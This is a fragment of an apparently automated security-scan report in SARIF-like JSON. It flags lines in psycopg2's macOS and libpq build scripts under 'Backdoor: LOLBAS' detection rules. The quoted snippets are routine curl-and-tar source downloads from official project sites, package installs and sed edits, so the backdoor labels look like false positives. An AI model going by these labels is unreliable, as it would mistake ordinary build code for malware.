          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 25,
                  "endLine": 85,
                  "endColumn": 4,
                  "snippet": {
                    "text": "fi\n\nlog \"installing cibuildwheel\"\nsource .venv/bin/activate\npip install cibuildwheel\n\nlog \"building wheels\"\n\n",
                    "rendered": {
                      "text": "fi\n\nlog \"installing cibuildwheel\"\nsource .venv/bin/activate\npip install cibuildwheel\n\nlog \"building wheels\"\n\n",
                      "markdown": "`fi\n\nlog \"installing cibuildwheel\"\nsource .venv/bin/activate\npip install cibuildwheel\n\nlog \"building wheels\"\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 11,
                  "endLine": 71,
                  "endColumn": 17,
                  "snippet": {
                    "text": "    command -v python${ver2} > /dev/null || (\n        log \"installing Python $ver3\"\n        (cd /tmp &&\n            curl -fsSl -O \\\n                https://www.python.org/ftp/python/${ver3}/python-${ver3}-macos11.pkg)\n        sudo installer -pkg /tmp/python-${ver3}-macos11.pkg -target /\n    )\n",
                    "rendered": {
                      "text": "    command -v python${ver2} > /dev/null || (\n        log \"installing Python $ver3\"\n        (cd /tmp &&\n            curl -fsSl -O \\\n                https://www.python.org/ftp/python/${ver3}/python-${ver3}-macos11.pkg)\n        sudo installer -pkg /tmp/python-${ver3}-macos11.pkg -target /\n    )\n",
                      "markdown": "`    command -v python${ver2} > /dev/null || (\n        log \"installing Python $ver3\"\n        (cd /tmp &&\n            curl -fsSl -O \\\n                https://www.python.org/ftp/python/${ver3}/python-${ver3}-macos11.pkg)\n        sudo installer -pkg /tmp/python-${ver3}-macos11.pkg -target /\n    )\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 23,
                  "endLine": 67,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n# Install the Python versions we want to build\nfor ver3 in $python_versions; do\n    ver2=$(echo $ver3 | sed 's/\\([^\\.]*\\)\\(\\.[^\\.]*\\)\\(.*\\)/\\1\\2/')\n    command -v python${ver2} > /dev/null || (\n        log \"installing Python $ver3\"\n        (cd /tmp &&\n",
                    "rendered": {
                      "text": "\n# Install the Python versions we want to build\nfor ver3 in $python_versions; do\n    ver2=$(echo $ver3 | sed 's/\\([^\\.]*\\)\\(\\.[^\\.]*\\)\\(.*\\)/\\1\\2/')\n    command -v python${ver2} > /dev/null || (\n        log \"installing Python $ver3\"\n        (cd /tmp &&\n",
                      "markdown": "`\n# Install the Python versions we want to build\nfor ver3 in $python_versions; do\n    ver2=$(echo $ver3 | sed 's/\\([^\\.]*\\)\\(\\.[^\\.]*\\)\\(.*\\)/\\1\\2/')\n    command -v python${ver2} > /dev/null || (\n        log \"installing Python $ver3\"\n        (cd /tmp &&\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 18,
                  "endLine": 25,
                  "endColumn": 24,
                  "snippet": {
                    "text": "cd \"${dir}/../../\"\n\n# Add /usr/local/bin to the path. It seems it's not, in non-interactive sessions\nif ! (echo $PATH | grep -q '/usr/local/bin'); then\n    export PATH=/usr/local/bin:$PATH\nfi\n\n",
                    "rendered": {
                      "text": "cd \"${dir}/../../\"\n\n# Add /usr/local/bin to the path. It seems it's not, in non-interactive sessions\nif ! (echo $PATH | grep -q '/usr/local/bin'); then\n    export PATH=/usr/local/bin:$PATH\nfi\n\n",
                      "markdown": "`cd \"${dir}/../../\"\n\n# Add /usr/local/bin to the path. It seems it's not, in non-interactive sessions\nif ! (echo $PATH | grep -q '/usr/local/bin'); then\n    export PATH=/usr/local/bin:$PATH\nfi\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 5,
                  "endLine": 7,
                  "endColumn": 13,
                  "snippet": {
                    "text": "#\n# This script is designed to run on Scaleway Apple Silicon machines.\n#\n# The script cannot be run as sudo (installing brew fails), but requires sudo,\n# so it can pretty much only be executed by a sudo user as it is.\n\nset -euo pipefail\n",
                    "rendered": {
                      "text": "#\n# This script is designed to run on Scaleway Apple Silicon machines.\n#\n# The script cannot be run as sudo (installing brew fails), but requires sudo,\n# so it can pretty much only be executed by a sudo user as it is.\n\nset -euo pipefail\n",
                      "markdown": "`#\n# This script is designed to run on Scaleway Apple Silicon machines.\n#\n# The script cannot be run as sudo (installing brew fails), but requires sudo,\n# so it can pretty much only be executed by a sudo user as it is.\n\nset -euo pipefail\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 6,
                  "endLine": 5,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\n# Build psycopg2-binary wheel packages for Apple M1 (cpNNN-macosx_arm64)\n#\n# This script is designed to run on Scaleway Apple Silicon machines.\n#\n# The script cannot be run as sudo (installing brew fails), but requires sudo,\n# so it can pretty much only be executed by a sudo user as it is.\n",
                    "rendered": {
                      "text": "\n# Build psycopg2-binary wheel packages for Apple M1 (cpNNN-macosx_arm64)\n#\n# This script is designed to run on Scaleway Apple Silicon machines.\n#\n# The script cannot be run as sudo (installing brew fails), but requires sudo,\n# so it can pretty much only be executed by a sudo user as it is.\n",
                      "markdown": "`\n# Build psycopg2-binary wheel packages for Apple M1 (cpNNN-macosx_arm64)\n#\n# This script is designed to run on Scaleway Apple Silicon machines.\n#\n# The script cannot be run as sudo (installing brew fails), but requires sudo,\n# so it can pretty much only be executed by a sudo user as it is.\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 11,
                  "endLine": 32,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\ncase \"$ID\" in\n    centos)\n        yum update -y\n        yum install -y zlib-devel krb5-devel pam-devel\n        ;;\n\n",
                    "rendered": {
                      "text": "\ncase \"$ID\" in\n    centos)\n        yum update -y\n        yum install -y zlib-devel krb5-devel pam-devel\n        ;;\n\n",
                      "markdown": "`\ncase \"$ID\" in\n    centos)\n        yum update -y\n        yum install -y zlib-devel krb5-devel pam-devel\n        ;;\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 173,
                  "endLine": 174,
                  "endColumn": 5,
                  "snippet": {
                    "text": "make -C src/bin/pg_config install\nmake -C src/include install\ncd ..\n\nfind ${LIBPQ_BUILD_PREFIX} -name \\*.so.\\* -type f -exec strip --strip-unneeded {} \\;\n",
                    "rendered": {
                      "text": "make -C src/bin/pg_config install\nmake -C src/include install\ncd ..\n\nfind ${LIBPQ_BUILD_PREFIX} -name \\*.so.\\* -type f -exec strip --strip-unneeded {} \\;\n",
                      "markdown": "`make -C src/bin/pg_config install\nmake -C src/include install\ncd ..\n\nfind ${LIBPQ_BUILD_PREFIX} -name \\*.so.\\* -type f -exec strip --strip-unneeded {} \\;\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 150,
                  "startColumn": 3,
                  "endLine": 150,
                  "endColumn": 8,
                  "snippet": {
                    "text": "\n    # Match the default unix socket dir default with what defined on Ubuntu and\n    # Red Hat, which seems the most common location\n    sed -i 's|#define DEFAULT_PGSOCKET_DIR .*'\\\n'|#define DEFAULT_PGSOCKET_DIR \"/var/run/postgresql\"|' \\\n        src/include/pg_config_manual.h\n\n",
                    "rendered": {
                      "text": "\n    # Match the default unix socket dir default with what defined on Ubuntu and\n    # Red Hat, which seems the most common location\n    sed -i 's|#define DEFAULT_PGSOCKET_DIR .*'\\\n'|#define DEFAULT_PGSOCKET_DIR \"/var/run/postgresql\"|' \\\n        src/include/pg_config_manual.h\n\n",
                      "markdown": "`\n    # Match the default unix socket dir default with what defined on Ubuntu and\n    # Red Hat, which seems the most common location\n    sed -i 's|#define DEFAULT_PGSOCKET_DIR .*'\\\n'|#define DEFAULT_PGSOCKET_DIR \"/var/run/postgresql\"|' \\\n        src/include/pg_config_manual.h\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 149,
                  "startColumn": 5,
                  "endLine": 149,
                  "endColumn": 10,
                  "snippet": {
                    "text": "    cd \"${postgres_dir}\"\n\n    # Match the default unix socket dir default with what defined on Ubuntu and\n    # Red Hat, which seems the most common location\n    sed -i 's|#define DEFAULT_PGSOCKET_DIR .*'\\\n'|#define DEFAULT_PGSOCKET_DIR \"/var/run/postgresql\"|' \\\n        src/include/pg_config_manual.h\n",
                    "rendered": {
                      "text": "    cd \"${postgres_dir}\"\n\n    # Match the default unix socket dir default with what defined on Ubuntu and\n    # Red Hat, which seems the most common location\n    sed -i 's|#define DEFAULT_PGSOCKET_DIR .*'\\\n'|#define DEFAULT_PGSOCKET_DIR \"/var/run/postgresql\"|' \\\n        src/include/pg_config_manual.h\n",
                      "markdown": "`    cd \"${postgres_dir}\"\n\n    # Match the default unix socket dir default with what defined on Ubuntu and\n    # Red Hat, which seems the most common location\n    sed -i 's|#define DEFAULT_PGSOCKET_DIR .*'\\\n'|#define DEFAULT_PGSOCKET_DIR \"/var/run/postgresql\"|' \\\n        src/include/pg_config_manual.h\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 144,
                  "startColumn": 9,
                  "endLine": 144,
                  "endColumn": 14,
                  "snippet": {
                    "text": "if [ ! -d \"${postgres_dir}\" ]; then\n    curl -sL \\\n        https://github.com/postgres/postgres/archive/${postgres_tag}.tar.gz \\\n        | tar xzf -\n\n    cd \"${postgres_dir}\"\n\n",
                    "rendered": {
                      "text": "if [ ! -d \"${postgres_dir}\" ]; then\n    curl -sL \\\n        https://github.com/postgres/postgres/archive/${postgres_tag}.tar.gz \\\n        | tar xzf -\n\n    cd \"${postgres_dir}\"\n\n",
                      "markdown": "`if [ ! -d \"${postgres_dir}\" ]; then\n    curl -sL \\\n        https://github.com/postgres/postgres/archive/${postgres_tag}.tar.gz \\\n        | tar xzf -\n\n    cd \"${postgres_dir}\"\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 142,
                  "startColumn": 3,
                  "endLine": 142,
                  "endColumn": 9,
                  "snippet": {
                    "text": "postgres_tag=\"REL_${postgres_version//./_}\"\npostgres_dir=\"postgres-${postgres_tag}\"\nif [ ! -d \"${postgres_dir}\" ]; then\n    curl -sL \\\n        https://github.com/postgres/postgres/archive/${postgres_tag}.tar.gz \\\n        | tar xzf -\n\n",
                    "rendered": {
                      "text": "postgres_tag=\"REL_${postgres_version//./_}\"\npostgres_dir=\"postgres-${postgres_tag}\"\nif [ ! -d \"${postgres_dir}\" ]; then\n    curl -sL \\\n        https://github.com/postgres/postgres/archive/${postgres_tag}.tar.gz \\\n        | tar xzf -\n\n",
                      "markdown": "`postgres_tag=\"REL_${postgres_version//./_}\"\npostgres_dir=\"postgres-${postgres_tag}\"\nif [ ! -d \"${postgres_dir}\" ]; then\n    curl -sL \\\n        https://github.com/postgres/postgres/archive/${postgres_tag}.tar.gz \\\n        | tar xzf -\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 132,
                  "startColumn": 3,
                  "endLine": 132,
                  "endColumn": 10,
                  "snippet": {
                    "text": "    make -C libraries/liblber/ install\n    make -C libraries/libldap/ install\n    make -C include/ install\n    chmod +x ${LIBPQ_BUILD_PREFIX}/lib/{libldap,liblber}*.so*\n    cd ..\n\nfi\n",
                    "rendered": {
                      "text": "    make -C libraries/liblber/ install\n    make -C libraries/libldap/ install\n    make -C include/ install\n    chmod +x ${LIBPQ_BUILD_PREFIX}/lib/{libldap,liblber}*.so*\n    cd ..\n\nfi\n",
                      "markdown": "`    make -C libraries/liblber/ install\n    make -C libraries/libldap/ install\n    make -C include/ install\n    chmod +x ${LIBPQ_BUILD_PREFIX}/lib/{libldap,liblber}*.so*\n    cd ..\n\nfi\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 113,
                  "startColumn": 13,
                  "endLine": 113,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    if [ ! -d \"${ldap_dir}\" ]; then\n        curl -sL \\\n            https://www.openldap.org/software/download/OpenLDAP/openldap-release/openldap-${ldap_tag}.tgz \\\n            | tar xzf -\n\n        cd \"${ldap_dir}\"\n\n",
                    "rendered": {
                      "text": "    if [ ! -d \"${ldap_dir}\" ]; then\n        curl -sL \\\n            https://www.openldap.org/software/download/OpenLDAP/openldap-release/openldap-${ldap_tag}.tgz \\\n            | tar xzf -\n\n        cd \"${ldap_dir}\"\n\n",
                      "markdown": "`    if [ ! -d \"${ldap_dir}\" ]; then\n        curl -sL \\\n            https://www.openldap.org/software/download/OpenLDAP/openldap-release/openldap-${ldap_tag}.tgz \\\n            | tar xzf -\n\n        cd \"${ldap_dir}\"\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 111,
                  "startColumn": 7,
                  "endLine": 111,
                  "endColumn": 13,
                  "snippet": {
                    "text": "    ldap_tag=\"${ldap_version}\"\n    ldap_dir=\"openldap-${ldap_tag}\"\n    if [ ! -d \"${ldap_dir}\" ]; then\n        curl -sL \\\n            https://www.openldap.org/software/download/OpenLDAP/openldap-release/openldap-${ldap_tag}.tgz \\\n            | tar xzf -\n\n",
                    "rendered": {
                      "text": "    ldap_tag=\"${ldap_version}\"\n    ldap_dir=\"openldap-${ldap_tag}\"\n    if [ ! -d \"${ldap_dir}\" ]; then\n        curl -sL \\\n            https://www.openldap.org/software/download/OpenLDAP/openldap-release/openldap-${ldap_tag}.tgz \\\n            | tar xzf -\n\n",
                      "markdown": "`    ldap_tag=\"${ldap_version}\"\n    ldap_dir=\"openldap-${ldap_tag}\"\n    if [ ! -d \"${ldap_dir}\" ]; then\n        curl -sL \\\n            https://www.openldap.org/software/download/OpenLDAP/openldap-release/openldap-${ldap_tag}.tgz \\\n            | tar xzf -\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 13,
                  "endLine": 84,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    if [ ! -d \"${sasl_dir}\" ]; then\n        curl -sL \\\n            https://github.com/cyrusimap/cyrus-sasl/archive/${sasl_tag}.tar.gz \\\n            | tar xzf -\n\n        cd \"${sasl_dir}\"\n\n",
                    "rendered": {
                      "text": "    if [ ! -d \"${sasl_dir}\" ]; then\n        curl -sL \\\n            https://github.com/cyrusimap/cyrus-sasl/archive/${sasl_tag}.tar.gz \\\n            | tar xzf -\n\n        cd \"${sasl_dir}\"\n\n",
                      "markdown": "`    if [ ! -d \"${sasl_dir}\" ]; then\n        curl -sL \\\n            https://github.com/cyrusimap/cyrus-sasl/archive/${sasl_tag}.tar.gz \\\n            | tar xzf -\n\n        cd \"${sasl_dir}\"\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 82,
                  "startColumn": 7,
                  "endLine": 82,
                  "endColumn": 13,
                  "snippet": {
                    "text": "    sasl_tag=\"cyrus-sasl-${sasl_version}\"\n    sasl_dir=\"cyrus-sasl-${sasl_tag}\"\n    if [ ! -d \"${sasl_dir}\" ]; then\n        curl -sL \\\n            https://github.com/cyrusimap/cyrus-sasl/archive/${sasl_tag}.tar.gz \\\n            | tar xzf -\n\n",
                    "rendered": {
                      "text": "    sasl_tag=\"cyrus-sasl-${sasl_version}\"\n    sasl_dir=\"cyrus-sasl-${sasl_tag}\"\n    if [ ! -d \"${sasl_dir}\" ]; then\n        curl -sL \\\n            https://github.com/cyrusimap/cyrus-sasl/archive/${sasl_tag}.tar.gz \\\n            | tar xzf -\n\n",
                      "markdown": "`    sasl_tag=\"cyrus-sasl-${sasl_version}\"\n    sasl_dir=\"cyrus-sasl-${sasl_tag}\"\n    if [ ! -d \"${sasl_dir}\" ]; then\n        curl -sL \\\n            https://github.com/cyrusimap/cyrus-sasl/archive/${sasl_tag}.tar.gz \\\n            | tar xzf -\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 13,
                  "endLine": 67,
                  "snippet": {
                    "text": "        cd \"${openssl_dir}\"\n    fi\n\n    # Install openssl\n    make install_sw\n    cd ..\n\nfi\n",
                    "rendered": {
                      "text": "        cd \"${openssl_dir}\"\n    fi\n\n    # Install openssl\n    make install_sw\n    cd ..\n\nfi\n",
                      "markdown": "`        cd \"${openssl_dir}\"\n    fi\n\n    # Install openssl\n    make install_sw\n    cd ..\n\nfi\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 54,
                  "startColumn": 13,
                  "endLine": 54,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    openssl_dir=\"openssl-${openssl_tag}\"\n    if [ ! -d \"${openssl_dir}\" ]; then curl -sL \\\n            https://github.com/openssl/openssl/archive/${openssl_tag}.tar.gz \\\n            | tar xzf -\n\n        cd \"${openssl_dir}\"\n\n",
                    "rendered": {
                      "text": "    openssl_dir=\"openssl-${openssl_tag}\"\n    if [ ! -d \"${openssl_dir}\" ]; then curl -sL \\\n            https://github.com/openssl/openssl/archive/${openssl_tag}.tar.gz \\\n            | tar xzf -\n\n        cd \"${openssl_dir}\"\n\n",
                      "markdown": "`    openssl_dir=\"openssl-${openssl_tag}\"\n    if [ ! -d \"${openssl_dir}\" ]; then curl -sL \\\n            https://github.com/openssl/openssl/archive/${openssl_tag}.tar.gz \\\n            | tar xzf -\n\n        cd \"${openssl_dir}\"\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 38,
                  "endLine": 52,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    # Build openssl if needed\n    openssl_tag=\"OpenSSL_${openssl_version//./_}\"\n    openssl_dir=\"openssl-${openssl_tag}\"\n    if [ ! -d \"${openssl_dir}\" ]; then curl -sL \\\n            https://github.com/openssl/openssl/archive/${openssl_tag}.tar.gz \\\n            | tar xzf -\n\n",
                    "rendered": {
                      "text": "    # Build openssl if needed\n    openssl_tag=\"OpenSSL_${openssl_version//./_}\"\n    openssl_dir=\"openssl-${openssl_tag}\"\n    if [ ! -d \"${openssl_dir}\" ]; then curl -sL \\\n            https://github.com/openssl/openssl/archive/${openssl_tag}.tar.gz \\\n            | tar xzf -\n\n",
                      "markdown": "`    # Build openssl if needed\n    openssl_tag=\"OpenSSL_${openssl_version//./_}\"\n    openssl_dir=\"openssl-${openssl_tag}\"\n    if [ ! -d \"${openssl_dir}\" ]; then curl -sL \\\n            https://github.com/openssl/openssl/archive/${openssl_tag}.tar.gz \\\n            | tar xzf -\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 11,
                  "endLine": 49,
                  "endColumn": 20,
                  "snippet": {
                    "text": "\nif [ \"$ID\" == \"centos\" ]; then\n\n    # Build openssl if needed\n    openssl_tag=\"OpenSSL_${openssl_version//./_}\"\n    openssl_dir=\"openssl-${openssl_tag}\"\n    if [ ! -d \"${openssl_dir}\" ]; then curl -sL \\\n",
                    "rendered": {
                      "text": "\nif [ \"$ID\" == \"centos\" ]; then\n\n    # Build openssl if needed\n    openssl_tag=\"OpenSSL_${openssl_version//./_}\"\n    openssl_dir=\"openssl-${openssl_tag}\"\n    if [ ! -d \"${openssl_dir}\" ]; then curl -sL \\\n",
                      "markdown": "`\nif [ \"$ID\" == \"centos\" ]; then\n\n    # Build openssl if needed\n    openssl_tag=\"OpenSSL_${openssl_version//./_}\"\n    openssl_dir=\"openssl-${openssl_tag}\"\n    if [ ! -d \"${openssl_dir}\" ]; then curl -sL \\\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_libpq.sh"
                },
                "region": {
                  "startLine": 33,
                  "startColumn": 7,
                  "endLine": 33,
                  "endColumn": 12,
                  "snippet": {
                    "text": "case \"$ID\" in\n    centos)\n        yum update -y\n        yum install -y zlib-devel krb5-devel pam-devel\n        ;;\n\n    alpine)\n",
                    "rendered": {
                      "text": "case \"$ID\" in\n    centos)\n        yum update -y\n        yum install -y zlib-devel krb5-devel pam-devel\n        ;;\n\n    alpine)\n",
                      "markdown": "`case \"$ID\" in\n    centos)\n        yum update -y\n        yum install -y zlib-devel krb5-devel pam-devel\n        ;;\n\n    alpine)\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
